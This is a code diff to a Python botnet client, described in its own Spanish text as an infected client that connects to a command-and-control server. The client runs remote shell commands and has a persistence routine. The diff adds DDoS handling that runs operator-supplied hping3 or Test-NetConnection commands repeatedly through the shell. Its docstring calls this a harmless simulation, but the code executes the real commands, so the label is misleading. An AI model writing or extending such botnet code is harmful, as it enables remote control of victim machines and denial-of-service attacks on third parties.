@@ -10,6 +10,7 @@ import sys
 import logging
 import configparser
 import traceback
+import time
 
 BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 parser = argparse.ArgumentParser(description="Cliente infectado para conectar al C&C.")
@@ -332,6 +333,8 @@ def intentar_persistencia():
     return mensaje_final
 
 def esperar_ordenes(bot):
+    global ddos_running
+    ddos_running = False
     while True:
         try:
             orden = bot.recv(1024).decode('utf-8', errors='ignore').strip()
@@ -345,6 +348,12 @@ def esperar_ordenes(bot):
                 continue
             elif orden == "persistencia":
                 resultado = intentar_persistencia().encode("utf-8")
+            elif "hping3" in orden or "Test-NetConnection" in orden:
+                ddos_running = True
+                resultado = simular_ddos(orden).encode("utf-8")
+            elif orden == "stop_ddos":
+                ddos_running = False
+                resultado = "[INFO] DDoS detenido".encode("utf-8")
             else:
                 resultado = ejecutar_comando(orden)
 
@@ -364,7 +373,30 @@ def ejecutar_comando(orden):
     except subprocess.CalledProcessError as e:
         logging.error(f"Error al ejecutar el comando '{orden}': {traceback.format_exc()}")
         return f"Error: {e.output.decode()}".encode('utf-8')
-    
+
+def simular_ddos(orden):
+    """
+    Simula un ataque DDoS de manera lenta y sin capacidad de realizar un ataque real.
+
+    :param orden: El comando de DDoS a simular.
+    :type orden: str
+    :return: Un mensaje indicando que la simulación se ha completado.
+    :rtype: str
+    """
+    try:
+        for i in range(10):
+            if not ddos_running:
+                break
+            if "hping3" in orden:
+                subprocess.run(orden, shell=True)
+            elif "Test-NetConnection" in orden:
+                subprocess.run(orden, shell=True)
+            time.sleep(5)  # Esperar 5 segundos entre cada intento
+        return "[INFO] Simulación de DDoS completada"
+    except Exception as e:
+        logging.error(f"Error al simular DDoS: {traceback.format_exc()}")
+        return "[ERROR] Error al simular DDoS"
+
 def ejecutar_bot():
     
     """
